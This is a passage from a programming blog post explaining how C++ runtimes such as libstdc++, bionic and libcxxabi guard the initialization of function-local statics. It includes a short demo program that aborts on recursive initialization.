somehow take care of recursive initialization.</p>

<p>Let&rsquo;s look at the <a href="http://mentorembedded.github.io/cxx-abi/abi.html#once-ctor">spec</a> and one <a href="http://www.opensource.apple.com/source/libcppabi/libcppabi-14/src/cxa_guard.cxx">implementation</a>, found by searching for
<code>__cxa_guard</code>.</p>

<p>Both of them show us the generated code for initializing things like local statics:</p>

<pre><code class="cpp">  if (obj_guard.first_byte == 0) {
    if ( __cxa_guard_acquire (&amp;obj_guard) ) {
      try {
      // ... initialize the object ...;
      } catch (...) {
        __cxa_guard_abort (&amp;obj_guard);
        throw;
      }
      // ... queue object destructor with __cxa_atexit() ...;
      __cxa_guard_release (&amp;obj_guard);
    }
  }
</code></pre>

<p>Here, <code>obj_guard</code> is our &ldquo;hidden static flag&rdquo;, with some other extra data.</p>

<p><code>__cxa_guard_acquire</code> and <code>__cxa_guard_release</code> acquire and release a lock to prevent recursive
initialization. So this program will crash:</p>

<pre><code class="cpp">#include&lt;iostream&gt;
using namespace std;

void foo(bool recur);

int bar(bool recur) {
 cout&lt;&lt;"bar called\n";
 if(recur) {
    foo(false);
 }
 return 0xFAFAFA;
}

void foo(bool recur) {
 cout&lt;&lt;"foo called\n";
 static int i = bar(recur);
 cout&lt;&lt;"Static is:"&lt;&lt; i&lt;&lt;"\n";
}



int main() {
 foo(true);
 return 0;
}
</code></pre>

<pre><code class="text">$ g++ test.cpp
$ ./a.out 
foo called
bar called
foo called
terminate called after throwing an instance of '__gnu_cxx::recursive_init_error'
  what():  std::exception
Aborted (core dumped)
</code></pre>

<p>Over here, to initialize <code>i</code>, <code>bar()</code> needs to be called, but <code>bar()</code> calls <code>foo()</code> which needs <code>i</code>
to be initialized, which again will call <code>bar()</code> (though this time it won&rsquo;t recurse). If <code>i</code> wasn&rsquo;t
<code>static</code> it would be fine, but now we have two calls trying to initialize <code>i</code>, and it&rsquo;s unclear as
to which value should be used.</p>

<p>The implementation is pretty interesting. Before looking at the code my quick guess was that the
following would happen for local statics:</p>

<ul>
<li><code>obj_guard</code> is a struct containing a mutex and a flag with three states:
&ldquo;uninitialized&rdquo;, &ldquo;initializing&rdquo;, and &ldquo;initialized&rdquo;. Alternatively, use an atomic state indicator.</li>
<li>When we try to initialize for the first time, the mutex is locked, the flag is set
to &ldquo;initializing&rdquo;, the mutex is released, the value is initialized, and the flag is set to &ldquo;initialized&rdquo;.</li>
<li>If when acquiring the mutex, the value is &ldquo;initialized&rdquo;, don&rsquo;t initialize again</li>
<li>If when acquiring the mutex, the value is &ldquo;initializing&rdquo;, throw some exception</li>
</ul>


<p> (We need the tristate flag because without it recursion would cause deadlocks)</p>

<p>I suppose that this implementation would work, though it&rsquo;s not the one being used. The
<a href="https://github.com/android/platform_bionic/blob/master/libc/bionic/__cxa_guard.cpp">implementation in bionic</a> (the Android version of the C stdlib) is similar; it
uses per-static atomics which indicate various states. However, it does not throw an exception when
we have a recursive initialization, it instead seems to deadlock<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. This is okay because the C++
spec says (<a href="http://www.open-std.org/jtc1/sc22/open/n2356/stmt.html#stmt.dcl">Section 6.7.4</a>)</p>

<blockquote><p>If control re-enters the declaration (recursively) while the object is being initialized, the
behavior is undefined.</p></blockquote>

<p>However, the implementations in <a href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/libsupc%2B%2B/guard.cc">gcc/libstdc++</a> (also <a href="http://www.opensource.apple.com/source/libcppabi/libcppabi-14/src/cxa_guard.cxx">this version</a> of
<code>libcppabi</code> from Apple, which is a bit more readable) do something different. They use a global
recursive mutex to handle reentrancy. Recursive mutexes basically can be locked multiple times by a
single thread, but cannot be locked by another thread till the locking thread unlocks them the same
number of times. This means that recursion/reentrancy won&rsquo;t cause deadlocks, but we still have one-
thread-at-a-time access. What these implementations do is:</p>

<ul>
<li><code>guard_object</code> is a set of two flags, one which indicates if the static is initialized,
and one which indicates that the static is being initialized (&ldquo;in use&rdquo;)</li>
<li>If the object is initialized, do nothing (this doesn&rsquo;t use mutexes and is cheap).
This isn&rsquo;t exactly part of the implementation in the library, but is part of the generated code.</li>
<li>If it isn&rsquo;t initialized, acquire the global recursive lock</li>
<li>If the object is initialized by the time the lock was acquired, unlock and return</li>
<li>If not, check if the static is being initialized from the second <code>guard_object</code> flag. If it is
&ldquo;in use&rdquo;, throw an exception.</li>
<li>If it wasn&rsquo;t, mark the second flag of the static&rsquo;s guard object as being &ldquo;in use&rdquo;</li>
<li>Call the initialization function, bubble errors</li>
<li>Unlock the global mutex</li>
<li>Mark the second flag as &ldquo;not in use&rdquo;</li>
</ul>


<p>At any one time, only one thread will be in the process of running initialization routines, due to
the global recursive mutex. Since the mutex is recursive, a function (eg <code>bar()</code>) used for
initializing local statics may itself use (different) local statics. Due to the &ldquo;in use&rdquo; flag, the
initialization of a local static may not recursively call its parent function without causing an
error.</p>

<p>This doesn&rsquo;t need per-static atomics, and doesn&rsquo;t deadlock, however it has the cost of a global
mutex which is called at most once per local static. In a highly threaded situation with lots of
such statics, one might want to reevaluate directly using local statics.</p>

<p><a href="https://github.com/llvm-mirror/libcxxabi/blob/master/src/cxa_guard.cpp#L188">LLVM&rsquo;s libcxxabi</a> is similar to the <code>libstdc++</code> implementation, but instead of a recursive
mutex it uses a regular mutex (on non-ARM Apple systems) which is unlocked before
<code>__cxa_guard_acquire</code> exits and tests for reentrancy by noting the thread ID in the guard object
instead of the &ldquo;in use&rdquo; flag. Condvars are used for waiting for a thread to stop using an object. On
other platforms, it seems to deadlock, though I&rsquo;m not sure.</p>

<p>So here we have a rather innocent-looking feature that has some hidden costs and pitfalls. But now I
can look at a line of code where this feature is being used, and have a good idea of what&rsquo;s
happening there. One step closer to being a better systems programmer!</p>

<p><em>Thanks to Rohan Prinja, Eduard Burtescu, and Nishant Sunny for reviewing drafts of this blog post</em></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Emphasis on <em>relatively</em>. This article will show that it&rsquo;s definitely not &ldquo;easy&rdquo; all the time.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>This was JNI code which obtained a JNI environment and pulled out method/class IDs from it to be used later<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>Unless it has a constructor or otherwise isn&rsquo;t made out of trivially constructible types; in this case it is treated similar to the previous case.<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>I checked later, and it was indeed the case that global statics are initialized before <code>Env()</code> is ready<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>I later verified this with a modification of the crashing program above stuck inside some JNI Android code.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
</feed>
